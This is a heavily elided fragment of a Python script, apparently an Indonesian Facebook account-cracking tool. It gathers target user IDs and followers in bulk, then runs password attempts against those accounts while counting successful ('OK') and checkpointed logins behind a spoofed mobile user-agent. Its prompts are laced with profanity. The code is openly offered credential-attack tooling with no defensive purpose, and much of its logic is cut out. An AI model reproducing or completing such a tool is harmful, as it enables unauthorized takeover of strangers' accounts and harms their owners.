...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© Jangan lupa : [green]Ngentod cong✓[white] ©©©'))
...
def menu(my_name,my_id):
	...
	cetak(nel('\tSELAMAT DATANG [green]%s[white] KONTOL'%(my_name)))
	...
	if _____alvino__adijaya_____ in ['1']:
		...
		back()
def error():
	print(f'{k}[f] Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('[f] Mau Berapa Target Ngentod ? : '))
	except ValueError:
		print('[f] Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
	...
	for met in range(jum):
		yz+=1
		kl = input('[f] Masukkan Idz Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f'[f] Total Idz Yang Terkumpul✓{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('[f] Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'[f]{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		...
		exit()
	print('[f] Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
	pil = input('[f] Masukkan Idz Target : ')
	try:
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			print(f'{k}[f] Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
...
def setting():
	...
	if hu in ['1','01']:
		...
		exit()
	print('[01] Api (Disarankan) ')
	print('[02] Touch  (Sellow)')
	print('')
	hc = input('[f] Pilih : ')
	if hc in ['1','01']:
...
def passwrd():
	...
	print('')
	print('[f] Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('[f] Pilih kontol : ')
	if woi in ['y','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[KRIBO] {P}{b}{loop}{P}✓{u}{len(id)}{P} [✓•OK] {P}{H}{ok}{P} [©•CP] {P}{k}{cp}{x} [{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 11; 2201116TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
